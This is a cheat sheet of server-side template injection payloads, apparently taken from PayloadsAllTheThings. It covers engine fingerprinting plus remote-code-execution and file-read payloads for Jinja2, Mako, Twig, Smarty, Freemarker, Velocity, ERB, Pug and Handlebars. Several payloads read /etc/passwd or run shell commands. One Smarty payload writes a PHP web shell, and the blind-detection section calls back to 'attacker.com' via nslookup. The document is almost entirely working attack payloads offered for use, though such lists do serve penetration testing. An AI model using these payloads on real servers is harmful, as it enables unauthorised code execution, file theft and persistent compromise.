# Server-Side Template Injection (SSTI) Payloads

> Source: PayloadsAllTheThings — Server Side Template Injection

## Detection — Universal Probe

```
${{<%[%'"}}%\.
```

Inject this and observe errors to identify the engine. Then use the decision tree:

```
${7*7} = 49?  -->  Check ${class.getForName('java.lang.Runtime')}
  Yes -> Java (Freemarker, Velocity, Thymeleaf)
  No  -> Try {{7*7}}

{{7*7}} = 49?
  Yes -> Try {{7*'7'}}
    '7777777' -> Jinja2
    '49'      -> Twig
  No  -> Try <%= 7*7 %>
    49 -> ERB
    No -> Try #{7*7}
      49 -> Pug/Jade or Slim
```

### Error-Based Engine Fingerprinting

```
(1/0).zxy.zxy
```

- `ZeroDivisionError` -> Python (Jinja2/Mako)
- `java.lang.ArithmeticException` -> Java (Freemarker/Velocity)
- `ReferenceError` / `TypeError` -> Node.js (Pug/Handlebars)

## Jinja2 (Python)

### Detection

```python
{{7*7}}
{{7*'7'}}          # returns '7777777'
{{config.items()}}
<pre>{% debug %}</pre>
```

### RCE

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__["os"].popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

### RCE Without Direct Builtins

```python
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen(request.args.cmd).read()}}
  {%endif%}
{%endfor%}
```

### File Read

```python
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

## Mako (Python)

### RCE

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

```python
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
```

## Twig (PHP)

### Detection

```php
{{7*7}}
{{dump(_context)}}
```

### RCE

```php
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
{{['cat /etc/passwd']|filter('system')}}
```

### File Read

```php
{{include("wp-config.php")}}
{{'/etc/passwd'|file_excerpt(1,30)}}
```

## Smarty (PHP)

### Detection

```php
{$smarty.version}
```

### RCE

```php
{system('id')}
{system('cat /etc/passwd')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

## Freemarker (Java)

### Detection

```
${3*3}
#{3*3}
```

### RCE

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

### File Read

```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

## Velocity (Java)

### RCE

```
#set($str=$class.inspect("java.lang.String").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$chr.toChars($out.read())#end
```

## ERB (Ruby)

### Detection

```ruby
<%= 7 * 7 %>
```

### RCE

```ruby
<%= `id` %>
<%= system('cat /etc/passwd') %>
<%= IO.popen('ls /').readlines() %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
```

### File Read

```ruby
<%= File.open('/etc/passwd').read %>
<%= Dir.entries('/') %>
```

## Pug / Jade (Node.js)

### Detection

```
#{7*7}
#{root.process}
```

### RCE

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
#{root.process.mainModule.require('child_process').execSync('id')}
```

## Handlebars (Node.js)

### RCE (< 4.1.2)

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## Blind SSTI Detection

Use time-based or OOB callbacks when output is not reflected:

```python
# Jinja2 time-based
{{ self.__init__.__globals__.__builtins__.__import__('time').sleep(5) }}

# Twig DNS callback
{{['nslookup attacker.com']|filter('system')}}

# Freemarker DNS callback
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nslookup attacker.com")}
```
